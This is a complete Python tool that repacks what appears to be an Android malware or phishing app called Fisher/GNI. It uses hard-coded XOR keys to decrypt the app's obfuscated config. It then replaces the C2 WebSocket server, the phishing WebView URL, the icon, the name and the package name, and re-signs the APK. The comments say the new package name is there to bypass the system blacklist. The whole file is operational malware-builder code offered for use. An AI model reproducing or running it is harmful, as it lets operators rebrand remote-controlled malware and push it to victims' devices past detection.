#!/usr/bin/env python3
"""
APK 重打包工具 - Fisher/GNI APK 定制版
功能：替换 C2 服务器地址、WebView H5 地址、APK 图标
"""

import zipfile
import json
import base64
import os
import sys
import shutil
import subprocess
import tempfile
from pathlib import Path
from io import BytesIO

# ============================================================
# 加密/解密引擎
# ============================================================

class ZM26Crypto:
    """ZM26 文件加密/解密 (assets/*.bt)"""
    
    MAGIC = b'ZM26'
    
    def __init__(self, xor_key_hex, salt_hex):
        self.key = bytes.fromhex(xor_key_hex)
        self.salt = bytes.fromhex(salt_hex)
        self.combined = self.salt + self.key  # 24 bytes
    
    def decrypt(self, data):
        """解密 .bt 文件 → 明文 JSON"""
        assert data[:4] == self.MAGIC, f"无效的 ZM26 文件头: {data[:4].hex()}"
        payload = data[12:]  # 跳过 4(magic) + 8(salt)
        decrypted = bytes([b ^ self.combined[i % len(self.combined)] for i, b in enumerate(payload)])
        return decrypted.rstrip(b'\x00')
    
    def encrypt(self, plaintext):
        """明文 → 加密的 .bt 文件"""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        payload = bytes([b ^ self.combined[i % len(self.combined)] for i, b in enumerate(plaintext)])
        return self.MAGIC + self.salt + payload


class ENCCrypto:
    """ENC 字段加密/解密 (serverUrl, webUrl 等)"""
    
    KEY1 = bytes([0x4a, 0x7f, 0x2b, 0x5e, 0x1c, 0x8d, 0x3a, 0x6f,
                  0x9e, 0x0d, 0x4c, 0x7b, 0x2a, 0x5f, 0x1e, 0x8c])
    KEY2 = bytes([0x3b, 0x6e, 0x1a, 0x4d, 0x0c, 0x7c, 0x2b, 0x5e,
                  0x8f, 0x0e, 0x3d, 0x6c, 0x1b, 0x4e, 0x0f, 0x7d])
    
    @staticmethod
    def _swap_pairs(data):
        """交换相邻字节对 (自逆操作)"""
        arr = bytearray(data)
        for i in range(0, len(arr) - 1, 2):
            arr[i], arr[i + 1] = arr[i + 1], arr[i]
        return bytes(arr)
    
    @classmethod
    def decrypt(cls, enc_str):
        """解密 ENC:xxx → 明文"""
        if enc_str.startswith('ENC:'):
            enc_str = enc_str[4:]
        
        # Step 1: Base64 解码
        data = bytearray(base64.b64decode(enc_str))
        
        # Step 2: 字节对交换
        data = bytearray(cls._swap_pairs(data))
        
        # Step 3: XOR with KEY2
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ cls.KEY2[i % 16]
        
        # Step 4: XOR with KEY1
        final = bytearray(len(result))
        for i in range(len(result)):
            final[i] = result[i] ^ cls.KEY1[i % 16]
        
        return bytes(final).decode('utf-8')
    
    @classmethod
    def encrypt(cls, plaintext):
        """明文 → ENC:xxx"""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        
        # 逆序操作
        # Step 1: XOR with KEY1
        step1 = bytearray(len(plaintext))
        for i in range(len(plaintext)):
            step1[i] = plaintext[i] ^ cls.KEY1[i % 16]
        
        # Step 2: XOR with KEY2
        step2 = bytearray(len(step1))
        for i in range(len(step1)):
            step2[i] = step1[i] ^ cls.KEY2[i % 16]
        
        # Step 3: 字节对交换 (自逆)
        step3 = cls._swap_pairs(bytes(step2))
        
        # Step 4: Base64 编码
        return 'ENC:' + base64.b64encode(step3).decode('ascii')


class StringCrypto:
    """StringUtil.a0 解密 (硬编码字符串)"""
    KEY = b'K9qZ-XlN7Q'
    
    @classmethod
    def decrypt(cls, b64_str):
        raw = base64.b64decode(b64_str)
        return bytes([raw[i] ^ cls.KEY[i % 10] for i in range(len(raw))]).decode('utf-8')
    
    @classmethod
    def encrypt(cls, plaintext):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        encrypted = bytes([plaintext[i] ^ cls.KEY[i % 10] for i in range(len(plaintext))])
        return base64.b64encode(encrypted).decode('ascii')


# ============================================================
# APK 重打包器
# ============================================================

class APKRepacker:
    def __init__(self, apk_path):
        self.apk_path = apk_path
        self.zm26 = None
        self.server_config = None
        self.meta = None
        self._load_meta()
    
    def _load_meta(self):
        """加载 ZM26 加密元数据"""
        with zipfile.ZipFile(self.apk_path, 'r') as z:
            self.meta = json.loads(z.read('assets/zm26_meta.json'))
            self.zm26 = ZM26Crypto(self.meta['xor_key'], self.meta['salt'])
            
            # 解密 server_config
            bt_name = self.meta['mapping']['server_config.json']
            encrypted = z.read(f'assets/{bt_name}')
            decrypted = self.zm26.decrypt(encrypted)
            # ZM26 解密后数据结构: [N字节前缀] + JSON文本
            # 前缀是校验/标识数据，加密时必须保留
            json_start = decrypted.find(b'{')
            if json_start >= 0:
                self._bt_prefix = decrypted[:json_start]  # 保存前缀（通常 8 字节）
                self.server_config = json.loads(decrypted[json_start:])
            else:
                self._bt_prefix = b''
                raise ValueError("无法解析 server_config.json")
    
    def show_current_config(self):
        """显示当前配置"""
        print("\n" + "=" * 60)
        print("📋 当前 APK 配置")
        print("=" * 60)
        
        server_url = self.server_config.get('serverUrl', '')
        web_url = self.server_config.get('webUrl', '')
        device_key_salt = self.server_config.get('deviceKeySalt', '')
        
        print(f"  应用名:       {self.server_config.get('pageStyleConfig', {}).get('appName', 'N/A')}")
        print(f"  版本:         {self.server_config.get('version', 'N/A')}")
        print(f"  构建时间:     {self.server_config.get('buildTime', 'N/A')}")
        print(f"  所有者:       {self.server_config.get('ownerUsername', 'N/A')}")
        
        if server_url.startswith('ENC:'):
            try:
                print(f"  C2 地址:      {ENCCrypto.decrypt(server_url)}")
            except:
                print(f"  C2 地址:      [解密失败] {server_url}")
        else:
            print(f"  C2 地址:      {server_url}")
        
        if web_url.startswith('ENC:'):
            try:
                print(f"  WebView 地址: {ENCCrypto.decrypt(web_url)}")
            except:
                print(f"  WebView 地址: [解密失败] {web_url}")
        else:
            print(f"  WebView 地址: {web_url}")
        
        print(f"  显示图标:     {self.server_config.get('showAppIcon', 'N/A')}")
        print(f"  卸载模式:     {self.server_config.get('uninstallMode', 'N/A')}")
    
    def repack(self, output_path, server_url=None, web_url=None,
               icon_path=None, app_name=None, owner=None, package_name=None):
        """
        重打包 APK
        
        Args:
            output_path: 输出 APK 路径
            server_url: 新的 C2 WebSocket 地址 (如 ws://your-server.com)
            web_url: 新的 WebView H5 地址 (如 http://your-site.com)
            icon_path: 新的图标文件路径 (PNG, 建议 512x512)
            app_name: 新的应用名称
            owner: 所有者用户名
            package_name: 新包名 (如 com.ui.cleaner)，用于绕过系统黑名单
            app_name: 新的应用名称
            owner: 新的 ownerUsername
        """
        print("\n" + "=" * 60)
        print("🔧 开始重打包 APK")
        print("=" * 60)
        
        # 1. 修改 server_config
        config = dict(self.server_config)
        modified = False
        # 提前保存原始包名和应用名（在修改 config 之前），供后面替换使用
        _orig_pkg = self.server_config.get('pageStyleConfig', {}).get('applicationId', '')
        _orig_app_name = self.server_config.get('pageStyleConfig', {}).get('appName', '')

        if server_url:
            enc_url = ENCCrypto.encrypt(server_url)
            config['serverUrl'] = enc_url
            print(f"  ✅ C2 地址: {server_url}")
            print(f"     加密后: {enc_url}")
            # 验证
            verify = ENCCrypto.decrypt(enc_url)
            assert verify == server_url, f"加密验证失败: {verify} != {server_url}"
            print(f"     验证OK: {verify}")
            modified = True
        
        if web_url:
            enc_url = ENCCrypto.encrypt(web_url)
            config['webUrl'] = enc_url
            print(f"  ✅ WebView: {web_url}")
            print(f"     加密后: {enc_url}")
            modified = True
        
        if app_name:
            config['configMaskText'] = app_name
            config['configMaskSubtitle'] = app_name
            if 'pageStyleConfig' in config:
                config['pageStyleConfig']['appName'] = app_name
            print(f"  ✅ 应用名: {app_name}")
            modified = True
        
        if package_name:
            if 'pageStyleConfig' in config:
                config['pageStyleConfig']['applicationId'] = package_name
            print(f"  ✅ 包名: {package_name}")
            modified = True

        if owner:
            config['ownerUsername'] = owner
            print(f"  ✅ 所有者: {owner}")
            modified = True
        
        # 2. 加密新的 server_config
        # 必须保持原版的 JSON 格式（indent=2），否则 APP 可能校验失败
        config_json = json.dumps(config, ensure_ascii=False, indent=2)
        bt_name = self.meta['mapping']['server_config.json']
        # 关键：必须在 JSON 前面加上原版的前缀字节（8字节校验头）
        plaintext_with_prefix = self._bt_prefix + config_json.encode('utf-8')
        new_bt_data = self.zm26.encrypt(plaintext_with_prefix)
        print(f"  ✅ 配置已加密 ({len(new_bt_data)} bytes, 前缀={self._bt_prefix.hex()})")
        
        # 3. 准备图标文件
        icon_sizes = {}
        if icon_path and os.path.exists(icon_path):
            try:
                from PIL import Image
                img = Image.open(icon_path)
                # Android 标准图标尺寸
                size_map = {
                    'mdpi': 48, 'hdpi': 72, 'xhdpi': 96,
                    'xxhdpi': 144, 'xxxhdpi': 192,
                }
                for density, size in size_map.items():
                    resized = img.resize((size, size), Image.LANCZOS)
                    buf = BytesIO()
                    resized.save(buf, format='PNG')
                    icon_sizes[density] = buf.getvalue()
                print(f"  ✅ 图标已缩放: {len(icon_sizes)} 个尺寸")
            except ImportError:
                # 没有 PIL，直接用原始图片替换所有尺寸
                with open(icon_path, 'rb') as f:
                    icon_data = f.read()
                for density in ['mdpi', 'hdpi', 'xhdpi', 'xxhdpi', 'xxxhdpi']:
                    icon_sizes[density] = icon_data
                print(f"  ⚠️  未安装 Pillow，图标不缩放直接替换")
        
        # 4. 重打包 APK
        print(f"\n  📦 正在重打包...")
        
        # 先找出 APK 中所有图标文件路径
        icon_entries = []
        with zipfile.ZipFile(self.apk_path, 'r') as z:
            for entry in z.namelist():
                if 'mipmap' in entry and 'ic_launcher' in entry and entry.endswith('.png'):
                    icon_entries.append(entry)
        
        # 创建新 APK (复制所有文件，替换需要修改的)
        # 注意：必须用 ZIP_STORED 作为默认，每个文件保留原始压缩方式
        unsigned_path = output_path + '.unsigned'
        with zipfile.ZipFile(self.apk_path, 'r') as zin:
            with zipfile.ZipFile(unsigned_path, 'w', zipfile.ZIP_STORED) as zout:
                for info in zin.infolist():
                    item = info.filename
                    data = zin.read(item)

                    # 替换 server_config
                    if item == f'assets/{bt_name}':
                        data = new_bt_data
                        print(f"     替换: {item}")

                    # 替换图标
                    if icon_sizes and item in icon_entries:
                        for density, icon_data in icon_sizes.items():
                            if density in item:
                                data = icon_data
                                print(f"     替换图标: {item}")
                                break

                    # 跳过旧签名文件（重签名需要）
                    if item.startswith('META-INF/') and (
                        item.endswith('.SF') or item.endswith('.RSA') or
                        item.endswith('.DSA') or item.endswith('.MF')):
                        continue

                    # 替换 AndroidManifest.xml 包名
                    if item == 'AndroidManifest.xml' and package_name:
                        if _orig_pkg and _orig_pkg != package_name:
                            old_u = _orig_pkg.encode('utf-16-le')
                            new_u = package_name.encode('utf-16-le')
                            if len(new_u) == len(old_u) and old_u in data:
                                count = data.count(old_u)
                                data = data.replace(old_u, new_u)
                                print(f"     替换包名: {_orig_pkg} → {package_name} ({count}处)")
                            elif old_u not in data:
                                print(f"     ⚠️  manifest 中未找到旧包名 {_orig_pkg}")
                            else:
                                print(f"     ⚠️  新旧包名长度不等，跳过 manifest 替换")
                        else:
                            print(f"     ℹ️  包名未变化，跳过 manifest 替换")

                    # resources.arsc: 替换应用名 + 必须 STORED（Android 11+）
                    if item == 'resources.arsc':
                        if app_name:
                            orig_name = _orig_app_name
                            if orig_name and orig_name != app_name:
                                # ARSC 的 StringPool 同时有 UTF-8 和 UTF-16 两种编码
                                for enc_name, old_bytes, new_bytes in [
                                    ('UTF-8', orig_name.encode('utf-8'), app_name.encode('utf-8')),
                                    ('UTF-16', orig_name.encode('utf-16-le'), app_name.encode('utf-16-le')),
                                ]:
                                    if old_bytes not in data:
                                        continue
                                    count = data.count(old_bytes)
                                    if len(old_bytes) == len(new_bytes):
                                        data = data.replace(old_bytes, new_bytes)
                                    elif len(new_bytes) < len(old_bytes):
                                        padded = new_bytes + b'\x00' * (len(old_bytes) - len(new_bytes))
                                        data = data.replace(old_bytes, padded)
                                    else:
                                        # 新名更长: 截断到等长
                                        data = data.replace(old_bytes, new_bytes[:len(old_bytes)])
                                    print(f"     替换应用名(ARSC/{enc_name}): {orig_name} -> {app_name} ({count}处)")
                        new_info = zipfile.ZipInfo(item)
                        new_info.compress_type = zipfile.ZIP_STORED
                        new_info.date_time = info.date_time
                        zout.writestr(new_info, data)
                    else:
                        # 保留原始压缩方式
                        new_info = zipfile.ZipInfo(item)
                        new_info.compress_type = info.compress_type
                        new_info.date_time = info.date_time
                        zout.writestr(new_info, data)

        
        print(f"  未签名 APK: {unsigned_path}")

        # 5. 签名 + zipalign
        signed = self._sign_apk(unsigned_path, output_path)
        if os.path.exists(unsigned_path):
            os.remove(unsigned_path)

        if signed:
            print(f"\n  签名+对齐完成: {output_path}")
        else:
            print(f"\n  签名失败，输出未签名 APK: {output_path}")

        # 6. 显示摘要
        print(f"\n{'='*60}")
        print("新 APK 配置摘要")
        print("=" * 60)
        if server_url:
            print(f"  C2 地址:  {server_url}")
        if web_url:
            print(f"  WebView:  {web_url}")
        if app_name:
            print(f"  应用名:   {app_name}")

        file_size = os.path.getsize(output_path) / 1024 / 1024
        print(f"  文件大小: {file_size:.1f} MB")
        print(f"  输出路径: {output_path}")

        return output_path

    def _sign_apk(self, input_path, output_path):
        """签名流程: zipalign(4字节对齐) → apksigner(v1+v2 签名)"""
        import shutil as _shutil

        BUILD_TOOLS = r"D:\Develop\android-sdk\build-tools\34.0.0"
        ZIPALIGN    = os.path.join(BUILD_TOOLS, 'zipalign.exe')
        APKSIGNER   = os.path.join(BUILD_TOOLS, 'apksigner.bat')
        keytool     = _shutil.which('keytool')

        if not os.path.exists(ZIPALIGN):
            print("  找不到 zipalign，无法对齐")
            return False
        if not os.path.exists(APKSIGNER):
            print("  找不到 apksigner")
            return False
        if not keytool:
            print("  找不到 keytool")
            return False

        keystore = os.path.join(os.path.dirname(input_path), '_debug.keystore')
        alias    = 'debugkey'
        password = 'android'

        # 生成 keystore（第一次）
        if not os.path.exists(keystore):
            print("  生成签名密钥...")
            result = subprocess.run([
                keytool, '-genkey', '-v',
                '-keystore', keystore, '-alias', alias,
                '-keyalg', 'RSA', '-keysize', '2048', '-validity', '10000',
                '-storepass', password, '-keypass', password,
                '-dname', 'CN=Debug,OU=Debug,O=Debug,L=Debug,S=Debug,C=US'
            ], capture_output=True, text=True)
            if result.returncode != 0:
                print(f"  生成密钥失败: {result.stderr}")
                return False

        # Step 1: zipalign（签名前必须先对齐）
        aligned_path = input_path + '.aligned'
        print("  zipalign 对齐中...")
        result = subprocess.run([
            ZIPALIGN, '-f', '-v', '4', input_path, aligned_path
        ], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"  zipalign 失败: {result.stderr}")
            return False
        print("  zipalign 完成")

        # Step 2: apksigner（v1 + v2 签名）
        print("  apksigner 签名中 (v1+v2)...")
        result = subprocess.run([
            APKSIGNER, 'sign',
            '--ks', keystore,
            '--ks-pass', f'pass:{password}',
            '--key-pass', f'pass:{password}',
            '--ks-key-alias', alias,
            '--v1-signing-enabled', 'true',
            '--v2-signing-enabled', 'true',
            '--out', output_path,
            aligned_path,
        ], capture_output=True, text=True, shell=True)
        if os.path.exists(aligned_path):
            os.remove(aligned_path)
        if result.returncode != 0:
            print(f"  apksigner 失败: {result.stdout} {result.stderr}")
            return False
        print("  APK 已签名 (v1+v2)")
        return True




# ============================================================
# 主程序 - 交互式命令行
# ============================================================

def main():
    print("""
╔══════════════════════════════════════════════════════╗
║          Fisher APK 重打包工具 v1.0                  ║
║  功能: 替换 C2 地址 / WebView H5 / 图标              ║
╚══════════════════════════════════════════════════════╝
    """)
    
    # 查找 APK
    apk_path = None
    for f in os.listdir('.'):
        if f.endswith('.apk'):
            apk_path = f
            break
    
    if not apk_path:
        print("❌ 当前目录下未找到 APK 文件")
        return 1
    
    print(f"📱 源 APK: {apk_path}")
    
    # 加载
    repacker = APKRepacker(apk_path)
    repacker.show_current_config()
    
    # 交互式输入
    print(f"\n{'='*60}")
    print("📝 请输入新的配置（直接回车跳过保持不变）")
    print("=" * 60)
    
    server_url = input("\n  新的 C2 WebSocket 地址\n  (如 wss://your-server.com): ").strip()
    web_url = input("\n  新的 WebView H5 地址\n  (如 https://your-site.com): ").strip()
    icon_path = input("\n  新的图标文件路径\n  (如 icon.png, 建议 512x512): ").strip()
    app_name = input("\n  新的应用名称\n  (如 MyApp): ").strip()
    
    if not any([server_url, web_url, icon_path, app_name]):
        print("\n❌ 未做任何修改")
        return 1
    
    # 输出文件名
    base_name = os.path.splitext(apk_path)[0]
    output_path = f"{base_name}_repacked.apk"
    
    # 执行重打包
    repacker.repack(
        output_path=output_path,
        server_url=server_url or None,
        web_url=web_url or None,
        icon_path=icon_path or None,
        app_name=app_name or None,
    )
    
    return 0


def cli_direct(server_url=None, web_url=None, icon_path=None, app_name=None, output=None, package_name=None):
    """非交互式调用"""
    apk_path = None
    for f in os.listdir('.'):
        if f.endswith('.apk') and 'repacked' not in f:
            apk_path = f
            break
    
    if not apk_path:
        print("❌ 未找到 APK")
        return 1
    
    repacker = APKRepacker(apk_path)
    repacker.show_current_config()
    
    output = output or apk_path.replace('.apk', '_repacked.apk')
    
    repacker.repack(
        output_path=output,
        server_url=server_url,
        web_url=web_url,
        icon_path=icon_path,
        app_name=app_name,
        package_name=package_name,
    )
    return 0


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description='Fisher APK 重打包工具')
    parser.add_argument('--server', help='C2 WebSocket 地址 (如 wss://your-server.com)')
    parser.add_argument('--web', help='WebView H5 地址 (如 https://your-site.com)')
    parser.add_argument('--icon', help='图标 PNG 路径')
    parser.add_argument('--name', help='应用名称')
    parser.add_argument('--package', help='新包名（必须和原包名等长14字符）')
    parser.add_argument('--output', '-o', help='输出 APK 路径')
    parser.add_argument('--interactive', '-i', action='store_true', help='交互模式')
    
    args = parser.parse_args()
    
    if args.interactive or not any([args.server, args.web, args.icon, args.name, args.package]):
        sys.exit(main())
    else:
        sys.exit(cli_direct(
            server_url=args.server,
            web_url=args.web,
            icon_path=args.icon,
            app_name=args.name,
            output=args.output,
            package_name=args.package,
        ))
